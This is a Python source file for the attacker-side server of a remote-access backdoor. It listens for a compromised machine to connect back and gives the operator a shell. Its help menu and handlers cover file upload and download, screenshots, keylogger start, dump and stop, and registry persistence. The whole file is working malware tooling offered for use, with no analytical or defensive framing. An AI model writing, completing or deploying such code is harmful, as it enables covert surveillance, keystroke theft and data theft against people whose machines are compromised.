# -*- Coding : utf-8 -*-

"""
    Backdoor server  to execute on attacker machine.
    Accept connection from target machine.
"""
import os
import socket
import sys
import threading, shutil

import termcolor


def help():
    help = """
    quit                : Quit session with the target
    clear               : Clear the screen
    cd <directory>      : Changes directory on target machine
    upload <filename>   : Upload file to target machine
    download <filename> : Download file to target machine
    screenshot          : Take a screenshot of target machine
    keylog start        : Start keylogger
    keylog dump         : Print keystokes that target inputted
    keylog stop         : Stop and self destruct keylogger file
    persistence         : Create persistence in Registry
    """
    return help

def upload_file(filename):
    with open(filename, "rb") as file:
        target.send(file.read())

def download_file(filename):
    with open(filename, "wb") as file:
        chunk = target.recv(1024)
        while chunk:
            file.write(chunk)
            try:
                chunk = target.recv(1024)
            except socket.timeout:
                break

def reliable_recv():
    data = ""
    while True:
        try:
            data = data + target.recv(1024).decode()
        except Exception as e:
            print(e)
        return data


def target_connection():
    count = 0
    while True:
        command = input(f"Shell@({termcolor.colored(ip[0],'cyan')}):~$ ")
        target.send(command.encode())

        if command == "quit":
            break
        elif command == "help":
            print(help())

        elif command == "clear":
            os.system("clear")

        elif command[:6] == "upload":
            upload_file(command[7:])

        elif command[:8] == "download":
            download_file(command[9:])

        elif command[:10] == "screenshot":
            with open(f"screenshot_{ip[0]}_{count}.png", "wb") as file:
                target.settimeout(3)
                chunk = target.recv(1024)
                while chunk:
                    file.write(chunk)
                    try:
                        chunk = target.recv(1024)
                    except socket.timeout:
                        break
                target.settimeout(None)
            count += 1
        else:
            response = reliable_recv()
            print(response)

    sock.close()

host = "0.0.0.0" # To accept connection from all interfaces
port = 65319

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.bind((host, port))

print("[+] Listening for incoming connections..")
sock.listen(5)
target, ip = sock.accept()

print(f"[+] Target connected from {ip}")
target_connection()


